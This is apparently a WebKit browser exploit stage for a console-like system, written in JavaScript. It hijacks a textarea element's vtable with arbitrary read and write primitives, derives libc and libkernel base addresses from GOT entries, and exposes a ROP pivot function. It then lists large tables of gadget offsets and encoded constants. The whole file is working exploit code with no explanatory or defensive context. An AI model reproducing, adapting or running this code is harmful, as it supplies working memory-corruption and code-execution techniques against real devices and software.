var tarea = document.createElement('textarea');

var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);

var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);

var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

var plt_ptr = read_ptr_at(fake_vtable) - 10063176;

function get_got_addr(idx)
{
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if(q[0] != 0xff || q[1] != 0x25)
        throw "invalid GOT entry";
    var offset = 0;
    for(var i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
}

//these are not real bases but rather some low addresses
var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705)-0x10000;
var libc_base = get_got_addr(582);
var saveall_addr = libc_base+0x2e2c8;
var loadall_addr = libc_base+0x3275c;
var setjmp_addr = libc_base+0xbfae0;
var longjmp_addr = libc_base+0xbfb30;
var pivot_addr = libc_base+0x327d2;
var infloop_addr = libc_base+0x447a0;
var jop_frame_addr = libc_base+0x715d0;
var get_errno_addr_addr = libkernel_base+0x9ff0;
var pthread_create_addr = libkernel_base+0xf980;

function saveall()
{
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
    tarea.scrollLeft = 0;
    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans;
}

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    var ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
    write_ptr_at(fake_vt_ptr+0x38, buf);
    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
    write_ptr_at(buf, ans);
    tarea.scrollLeft = 0;
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}

//funciones 
function db(data){}
lb=libc_base;
wb=webkit_base;
_4GB=4294967296;
a=lb+788575;
b=wb+14461559;
c=lb+793877;
d=lb+248252;
e=lb+471355;
f=lb+811575;
g=lb+882884;
h=lb+206806;
i=wb+7438103;
j=lb+50775;
k=lb+759626;
l=wb+432898;
m=lb+792472;
n=lb+547636;
o=lb+270800;
p=wb+3750700;
q=lb+877546;
r=lb+523896;
s=wb+1786005;
t=wb+6227286;
u=lb+877568;
v=lb+191168;
w=wb+75236;
x=lb+191169;
y=wb+5202439;
z=wb+2997875;
A=wb+954100;
B=wb+14959219;
C=lb+269973;
D=wb+11676600;
E=lb+186490;
F=lb+877175;
G=wb+1838146;
H=lb+270096;
I=wb+865136;
J=wb+1506828;
K=lb+272260;
L=lb+877877;
M=wb+8975893;
N=wb+1026352;
O=lb+785097;
P=wb+8824269;
Q=lb+389047;
R=wb+414627;
S=wb+105267;
T=wb+10235455;
U=lb+11;
V=lb+785193;
W=lb+582033;
X=wb+48555;
Y=lb+785347;
Z=lb+562536;
a0=wb+11349202;
a1=wb+11924577;
a2=wb+2810902;
a3=lb+547950;
a4=db([8,0]);
a5=db([4294967295,4294967295]);
a6=db([0,0]);
a7=db([16,0]);
a8=db([48,0]);
a9=db([4294967288,4294967295]);
aa=db([32,0]);
ab=db([24,0]);
ac=db([16711680,0]);
ad=db([65280,0]);
ae=db([4294967284,4294967295]);
af=db([4,0]);
ag=db([7,0]);
ah=db([4294967283,4294967295]);
ai=db([1,0]);
aj=db([40,0]);
ak=db([9,0]);
al=db([6,0]);
am=db([10,0]);
an=db([11,0]);
ao=db([12,0]);
ap=db([13,0]);
aq=db([5,0]);
ar=db([14,0]);
as=db([15,0]);
at=db([17,0]);
au=db([18,0]);
av=db([19,0]);
aw=db([20,0]);
ax=db([21,0]);
ay=db([3,0]);
az=db([22,0]);
aA=db([23,0]);
aB=db([25,0]);
aC=db([26,0]);
aD=db([27,0]);
aE=db([28,0]);
aF=db([29,0]);
aG=db([30,0]);
aH=db([31,0]);
aI=db([37,0]);
aJ=db([33,0]);
aK=db([34,0]);
aL=db([35,0]);
aM=db([36,0]);
aN=db([38,0]);
aO=db([56,0]);
aP=db([4294967280,4294967295]);
aQ=db([208,0]);
aR=db([4294967080,4294967295]);
aS=db([4294967088,4294967295]);
aT=db([4294967096,4294967295]);
aU=db([4294967104,4294967295]);
aV=db([4294967112,4294967295]);
aW=db([4294967272,4294967295]);
aX=db([4294967192,4294967295]);
aY=db([128,0]);
aZ=db([4096,0]);
b0=db([2,0]);
b1=db([65536,0]);
b2=db([4294967248,4294967295]);
b3=db([312,0]);
b4=db([4294967264,4294967295]);
b5=db([200,0]);
b6=db([192,0]);
b7=db([184,0]);
b8=db([176,0]);
b9=db([168,0]);
ba=db([4294967292,4294967295]);
bb=db([61,0]);
bc=db([41,0]);
bd=db([4294967256,4294967295]);
be=db([51,0]);
bf=db([46,0]);
bg=db([65,0]);
bh=db([1032,0]);
bi=db([4294966272,4294967295]);
bj=db([4294966268,4294967295]);
bk=db([4294966264,4294967295]);
bl=db([272,0]);
bm=db([4294967040,4294967295]);
bn=db([256,0]);
bo=db([4294967036,4294967295]);
bp=db([4294967028,4294967295]);
bq=db([4294967032,4294967295]);
br=db([4294901760,4294967295]);
bs=db([4294967024,4294967295]);
bt=db([65535,0]);
bu=db([264,0]);
bv=db([104,0]);
bw=db([2104,0]);
bx=db([4294965216,4294967295]);
by=db([4294965208,4294967295]);
bz=db([2048,0]);
bA=db([4294965248,4294967295]);
bB=db([4294965204,4294967295]);
bC=db([4294965200,4294967295]);
bD=db([4294965196,4294967295]);
bE=db([4294967276,4294967295]);
bF=db([4294967168,4294967295]);
bG=db([4294967184,4294967295]);
bH=db([4294967200,4294967295]);
bI=db([4294967208,4294967295]);
bJ=db([4294967224,4294967295]);
bK=db([4294967240,4294967295]);
bL=db([125,0]);
bM=db([4294967286,4294967295]);
bN=db([280,0]);
bO=db([4294967020,4294967295]);
bP=db([4294967016,4294967295]);
bQ=db([216,0]);
bR=db([4294967120,4294967295]);
bS=db([4294967136,4294967295]);
bT=db([4294967144,4294967295]);
bU=db([4294967160,4294967295]);
bV=db([4294967176,4294967295]);
bW=db([4294967216,4294967295]);
bX=db([36421248,0]);
bY=db([2376,0]);
bZ=db([179,0]);
c0=db([16384,0]);
c1=db([4294967270,4294967295]);
c2=db([4294967260,4294967295]);
c3=db([4294966236,4294967295]);
c4=db([4294965212,4294967295]);
c5=db([4294965172,4294967295]);
c6=db([4294965176,4294967295]);
c7=db([4294965180,4294967295]);
c8=db([4294965188,4294967295]);
c9=db([4294965156,4294967295]);
ca=db([66,0]);
cb=db([4294965152,4294967295]);
cc=db([4294965148,4294967295]);
cd=db([4294965144,4294967295]);
ce=db([4294965140,4294967295]);
cf=db([322371584,0]);
cg=db([4294965136,4294967295]);
ch=db([4294965120,4294967295]);
ci=db([1932591104,0]);
cj=db([4294965116,4294967295]);
ck=db([4294965080,4294967295]);
cl=db([4294965076,4294967295]);
cm=db([4095,0]);
cn=db([4294965104,4294967295]);
co=db([4294965096,4294967295]);
cp=db([4294965088,4294967295]);
cq=db([4024544,0]);
cr=db([4294965064,4294967295]);
cs=db([17948672,0]);
ct=db([4294965056,4294967295]);
cu=db([4294965048,4294967295]);
cv=db([304,0]);
cw=db([4294965040,4294967295]);
cx=db([4294965032,4294967295]);
cy=db([0,536870912]);
cz=db([4294965028,4294967295]);
cA=db([4294965024,4294967295]);
cB=db([4294965016,4294967295]);
cC=db([0,1073741824]);
cD=db([4294965008,4294967295]);
cE=db([96,0]);
cF=db([4294965000,4294967295]);
cG=db([3343406679,65729]);
cH=db([2370588928,4294962949]);
cI=db([2156612095,4072]);
cJ=db([4173842248,1207959552]);
cK=db([246460557,3343384916]);
cL=db([706,2156742656]);
cM=db([55200,3797537023]);
cN=db([1281318608,4290643341]);
cO=db([2336882687,1040512]);
cP=db([64,0]);
cQ=db([1200179200,2337039720]);
cR=db([72,0]);
cS=db([9484,2337079296]);
cT=db([80,0]);
cU=db([2337081417,2337097801]);
cV=db([88,0]);
cW=db([2156609801,4084]);
cX=db([3239349069,1293060941]);
cY=db([1293439627,18387595]);
cZ=db([112,0]);
d0=db([3343450112,4162]);
d1=db([120,0]);
d2=db([2336292864,1046656]);
d3=db([344673536,311119297]);
d4=db([136,0]);
d5=db([408062797,412257101]);
d6=db([144,0]);
d7=db([1224736769,6832839]);
d8=db([152,0]);
d9=db([1090519040,268206219]);
da=db([160,0]);
db=db([2337079296,2337128724]);
dc=db([1384860946,2458602776]);
dd=db([280,272811849]);
de=db([0,3223326714]);
df=db([3400,893911041]);
dg=db([65536,1237328399]);
dh=db([266895499,2160459776]);
di=db([168583,2424358891]);
dj=db([224,0]);
dk=db([4,1207959552]);
dl=db([232,0]);
dm=db([78807239,2649292800]);
dn=db([240,0]);
do_=db([2160459777,701818]);
dp=db([248,0]);
dq=db([2105591351,922749621]);
dr=db([3095447398,3942663453]);
ds=db([3498100228,3087012030]);
dt=db([3201401031,16]);
du=db([3343384576,300028032]);
dv=db([288,0]);
dw=db([513,2290960384]);
dx=db([296,0]);
dy=db([3260508,411601224]);
dz=db([1208029666,185]);
dA=db([256,2290698240]);
dB=db([320,0]);
dC=db([17949240,1220550671]);
dD=db([328,0]);
dE=db([16777229,3223457536]);
dF=db([336,0]);
dG=db([2156612091,4056]);
dH=db([344,0]);
dI=db([57599,0]);
dJ=db([352,0]);
dK=db([4056,0]);
dL=db([4064,0]);
dM=db([4072,0]);
dN=db([4084,0]);
dO=db([4088,0]);
dP=db([4092,0]);
dQ=db([4294964960,4294967295]);
dR=db([4294964968,4294967295]);
dS=db([4294964976,4294967295]);
dT=db([4294964984,4294967295]);
dU=db([4294964992,4294967295]);
dV=db([4294964956,4294967295]);
dW=db([4294964924,4294967295]);
dX=db([4294964936,4294967295]);
dY=db([4294964920,4294967295]);
dZ=db([0,0,100000,0,0,0]);
e0=db([1702258027,1633645678,544367716,2016419901,2020371493,10]);
e1=db([1952737651,807419168,2020091256,628633632,175664236,0]);
e2=db([543580533,169962351,0,0]);
e3=db([1919252079,1601200492,544760937,1680154685,10,0]);
e4=db([1852990827,1650420837,543519585,2016419901,2020371493,10]);
e5=db([1970435187,1885303907,543387506,2016419901,2020371493,10]);
e6=db([809334898,1819026808,2003968120,628633661,175664236,0]);
e7=db([1936682083,1713398885,1680154724,10]);
e8=db([4294967265,4294967295]);
e9=db([4294967266,4294967295]);
ea=db([15651,0]);
eb=db([4294967268,4294967295]);
ec=db([16777343,0]);
ed=db([4294967252,4294967295]);
ee=db([4294967257,4294967295]);
ef=db([4294967258,4294967295]);
eg=db([15395,0]);
eh=db([4294967244,4294967295]);
ei=db([4294965192,4294967295]);
ej=db([4294967072,4294967295]);
ek=db([5,0,0,0,0,0]);


